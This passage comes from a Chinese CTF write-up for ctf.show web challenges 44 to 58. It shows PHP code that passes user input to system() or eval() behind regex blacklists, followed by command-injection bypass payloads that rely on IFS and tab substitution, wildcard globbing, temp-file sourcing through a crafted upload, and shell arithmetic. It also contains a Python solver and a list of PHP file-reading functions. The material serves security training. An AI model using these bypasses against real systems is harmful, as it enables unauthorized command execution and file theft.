class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac fla*||</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格被过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla*||</span><br><span class="line">/?c=tac$IFS$fla*||</span><br><span class="line">/?c=tac$IFS$1fla*||</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ls||</span><br><span class="line">回显flag.php index.php</span><br><span class="line">/?c=tac%09fla?????||</span><br><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>grep<br>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>grep test *file<br>strings</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac%09fla?.php||</span><br></pre></td></tr></table></figure><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tac</code>被过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=t\ac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>$</code>被放出来了，还有<code>flag</code>在根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ta\c$&#123;IFS&#125;../../../fla\g||</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=ta\c$&#123;IFS&#125;fla\g.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=grep$&#123;IFS&#125;show$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然<code>ban</code>掉了所有的字母，但是留下了数字，可以通过匹配bin下存在的命令进行读取flag</p><blockquote><p>bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>cat或者ls等等都其实是简写，例如ls完整全称应该是&#x2F;bin&#x2F;ls</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=/???/????64 ????????</span><br></pre></td></tr></table></figure><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了数字字母但是给了<code>.</code>和<code>?</code></p><blockquote><p>PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母，最后一个字母大概率是大写</p><p>.  相当于source 可以执行文件 </p><p>&#96;&#96;可以执行命令</p><p>[@-[]   可以表示任意大写字母 </p><p>在ASCII码中  @ &lt; A   , [  &gt; Z  ,</p></blockquote><p>从网上找一份<a href="https://blog.csdn.net/Kracxi/article/details/121766050">上传代码</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://c170210b-f33a-4717-8667-50f3a7931dac.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    上传的文件在网站目录下</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发包即可</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?c=.%20/???/????????[@-[]</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c170210b-f33a-4717-8667-50f3a7931dac.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------30303294254096021847704335588</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>343</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------30303294254096021847704335588</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">cat flag.php</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------30303294254096021847704335588</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">??浜?</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------30303294254096021847704335588--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在shell中可以利用<code>$</code>和<code>()</code>进行构造数字</p><blockquote><p><code>$(())</code> 代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code> 再对-2做一次取反得到1，所以值为1</p><p>如果对<code>a</code>按位取反，则得到的结果为<code>-(a+1)</code>，也就是对0取反得到-1</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://373648e5-52f2-4eb8-a837-45fa0c6d15df.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;/?c=&#x27;</span> +<span class="string">&#x27;$((~((&#x27;</span> + <span class="string">&#x27;$((~$(())))&#x27;</span>*<span class="number">37</span> + <span class="string">&#x27;))))&#x27;</span> </span><br><span class="line">reponse = requests.get(url=url+payload)</span><br><span class="line">flag = re.findall(<span class="string">&#x27;ctfshow&#123;.*?&#125;&#x27;</span>, reponse.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>蚁剑可以直接连接（<code>后面的题目都可以</code>），也可以通过如下命令读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>一些读取文件函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)); <span class="comment">// var_dump</span></span><br><span class="line"><span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line"><span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="variable">$filename</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br></pre></td></tr></table></figure><h3 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span 